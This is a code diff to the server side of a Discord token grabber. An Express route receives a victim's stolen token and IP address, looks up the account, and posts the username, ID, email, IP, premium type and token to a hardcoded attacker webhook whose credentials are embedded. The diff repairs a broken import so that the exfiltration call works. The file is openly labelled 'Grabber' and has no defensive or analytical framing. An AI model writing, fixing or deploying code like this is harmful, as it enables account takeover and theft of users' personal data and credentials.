@@ -1,7 +1,7 @@
 const express = require('express');
 const router = express.Router();
 const fetch = require('node-fetch');
-const {WebhookClient} = require('discord.js');
+const {WebhookClient, MessageEmbed} = require('discord.js');
     const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
 
 router.get('/', (req,res) => {
@@ -11,7 +11,7 @@ router.get('/', (req,res) => {
     let user = getUserData(req.query.token);
     if(user == null) return res.send('no done');
     
-    webhook.send(new discord.MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
+    webhook.send(new MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
     res.send('done');
 })
 
